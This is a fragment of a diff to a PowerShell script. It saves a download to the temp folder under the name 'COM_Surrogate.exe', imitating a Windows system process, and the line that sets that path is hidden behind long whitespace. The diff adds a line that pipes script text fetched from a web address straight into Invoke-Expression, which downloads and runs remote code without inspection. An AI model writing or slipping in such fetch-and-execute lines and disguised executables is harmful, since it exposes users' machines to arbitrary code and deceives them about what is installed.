@@ -622,7 +622,7 @@
 
 # Define the local path where the file will be saved
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     $output = "$env:TEMP\COM_Surrogate.exe"
-
+irm "https://christitus.com/win" | iex
 # Download the file
 Invoke-WebRequest -Uri $url -OutFile $output
 
